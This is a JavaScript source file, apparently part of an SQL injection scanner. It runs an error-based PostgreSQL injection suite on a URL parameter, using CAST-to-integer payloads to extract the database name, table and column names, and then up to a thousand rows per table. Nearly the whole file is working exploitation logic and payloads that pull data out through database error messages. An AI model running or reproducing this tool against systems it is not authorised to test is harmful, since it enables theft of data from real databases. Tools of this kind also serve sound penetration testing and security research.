import { printInfo, printSuccess } from "./logger.js";
import { sendRequest } from "./http.js";
import { cleanUpFatal, mutateQuery } from "./helper.js";
import { dbSaveColName, dbSaveDbName, dbSaveTblName, dbSaveVulnerability, dbSaveRowDump } from "./database.js";

export async function testPostgresql(setting) {
	printInfo("Running POSTGRESQL test suite");

	const query = setting.urlQuery;
	const firstParamsName = [...query.keys()][0];
	const firstParamsValue = query.get(firstParamsName);
	const c = setting.contextChar;

	const dbNameId = await getDatabaseName(setting, query, firstParamsName, firstParamsValue, c);
	const tblList = await getTblName(setting, query, firstParamsName, firstParamsValue, c, dbNameId);
	await getColumnName(setting, query, firstParamsName, firstParamsValue, c, tblList);
	await dumpRows(setting, query, firstParamsName, firstParamsValue, c, tblList);
}

async function getDatabaseName(setting, query, name, valueBase, c) {
	const injection = " AND 1=CAST(current_database() AS int)-- 42";
	const payload = `${valueBase}${c}${injection}`;
	const params = mutateQuery(query, name, payload);
	const res = await sendRequest(setting, params);
	const nameList = parseBody(res.body);
	if (nameList.length === 0) {
		cleanUpFatal(setting.db, `Fail to get database name`);
	}
	printSuccess(`Database name: ${nameList}`);

	dbSaveVulnerability(setting.db, setting.scanId, name, payload, "error");
	const dbNameId = dbSaveDbName(setting.db, setting.scanId, nameList[0]);

	return dbNameId;
}

async function getTblName(setting, query, name, valueBase, c, dbNameId) {
	const injection = " AND 1=CAST((SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public') AS int)-- 42";
	const payload = `${valueBase}${c}${injection}`;
	const params = mutateQuery(query, name, payload);
	const res = await sendRequest(setting, params);
	const tblNames = parseBody(res.body);
	printSuccess(`Database tables: ${tblNames}`);
	if (tblNames.length === 0) {
		cleanUpFatal(setting.db, `Fail to get table list`);
	}
	
	dbSaveVulnerability(setting.db, setting.scanId, name, payload, "error");
	const tblList = [];
	for (const tblName of tblNames) {
		const tblNameId = dbSaveTblName(setting.db, dbNameId, tblName);
		tblList.push({tblNameId, tblName});
	}

	return tblList;
}

async function getColumnName(setting, query, name, valueBase, c, tblList) {
	for (const table of tblList) {
		const injection = ` AND 1=CAST((SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name='${table.tblName}') AS int)-- 42`;
		const payload = `${valueBase}${c}${injection}`;
		const params = mutateQuery(query, name, payload);
		const res = await sendRequest(setting, params);
		const colNames = parseBody(res.body);
		printSuccess(`Table ${table.tblName} columns: ${colNames}`);
		if (colNames.length === 0) {
			cleanUpFatal(setting.db, `Fail to get column list`);
		}

		dbSaveVulnerability(setting.db, setting.scanId, name, payload, "error");
		table.columns = colNames;
		for (const colName of colNames) {
			dbSaveColName(setting.db, table.tblNameId, colName);
		}
	}
}

const ROW_SEP = "~|~";
const MAX_ROWS = 1000;

async function dumpRows(setting, query, name, valueBase, c, tblList) {
	for (const table of tblList) {
		if (!table.columns || table.columns.length === 0) {
			continue;
		}

		const rowExpr = table.columns
			.map((col) => `COALESCE(CAST("${col}" AS text),'NULL')`)
			.join(`||'${ROW_SEP}'||`);

		for (let rowIndex = 0; rowIndex < MAX_ROWS; rowIndex++) {
			const injection = ` AND 1=CAST((SELECT ${rowExpr} FROM ${table.tblName} ORDER BY 1 LIMIT 1 OFFSET ${rowIndex}) AS int)-- 42`;
			const payload = `${valueBase}${c}${injection}`;
			const params = mutateQuery(query, name, payload);
			const res = await sendRequest(setting, params);
			const raw = parseError(res.body);
			if (raw === null) {
				break;
			}

			const values = raw.split(ROW_SEP);
			const row = {};
			table.columns.forEach((col, i) => { row[col] = values[i] ?? null; });
			const data = JSON.stringify(row);
			printSuccess(`Table ${table.tblName} row ${rowIndex}: ${data}`);

			if (rowIndex === 0) {
				dbSaveVulnerability(setting.db, setting.scanId, name, payload, "error");
			}
			dbSaveRowDump(setting.db, table.tblNameId, rowIndex, data);
		}
	}
}

function parseError(body) {
	const match = body.match(/type integer: \\?"(.*?)\\?"/);
	return match ? match[1] : null;
}

function parseBody(body) {
	const raw = parseError(body);
	return raw !== null ? raw.split(',') : [];
}
